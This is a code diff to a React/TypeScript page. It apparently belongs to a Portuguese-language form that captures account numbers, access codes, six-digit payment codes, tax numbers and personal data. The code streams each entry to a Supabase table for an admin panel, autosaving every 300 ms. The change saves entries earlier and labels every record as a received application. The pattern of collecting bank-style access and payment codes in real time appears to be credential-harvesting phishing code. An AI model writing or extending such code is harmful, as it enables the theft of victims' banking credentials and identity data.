@@ -176,16 +176,17 @@ function Index() {
 
   const saveProgress = async (immediate = false) => {
     // Don't save if on home or admin steps
-    if (step === "home" || step === "admin" || step === "success") return;
+    if (step === ("home" as any) || step === ("admin" as any) || step === ("success" as any)) return;
     
     try {
       const { supabase } = await import("@/integrations/supabase/client");
       
       const pCodeStr = paymentCode.join("");
       
-      // Requirement: Only show in admin panel if we have the 3 main fields:
-      // account_number, access_code, and payment_code.
-      const hasMainData = accountNumber && accessCode && pCodeStr.length === 6;
+      // Requirement: The application should only be saved and visible in the admin panel 
+      // from the moment the user reaches the payment code stage (step2).
+      // We skip saving if they are on 'home' or 'login' steps.
+      if (step === ("home" as any) || step === ("login" as any)) return;
 
       const payload: any = {
         account_number: accountNumber || null,
@@ -199,7 +200,7 @@ function Index() {
         nif: personalData.nif || null,
         step: step,
         updated_at: new Date().toISOString(),
-        status: hasMainData ? "Candidatura recebida" : "Pendente"
+        status: "Candidatura recebida"
       };
 
       // Filter out null/empty values to avoid overwriting existing data with nulls
@@ -236,14 +237,14 @@ function Index() {
 
   // Immediate save on critical steps like payment code and personal data
   useEffect(() => {
-    if (step === "step3" || step === "step4" || step === "confirm" || step === "summary") {
+    if (step === ("step3" as any) || step === ("step4" as any) || step === ("confirm" as any) || step === ("summary" as any)) {
       saveProgress(true);
     }
   }, [step]);
 
   // Auto-save application progress with high sensitivity
   useEffect(() => {
-    if (step !== "home" && step !== "admin") {
+    if (step !== ("home" as any) && step !== ("admin" as any)) {
       const timer = setTimeout(() => {
         saveProgress();
       }, 300); // Higher frequency for 100% precision
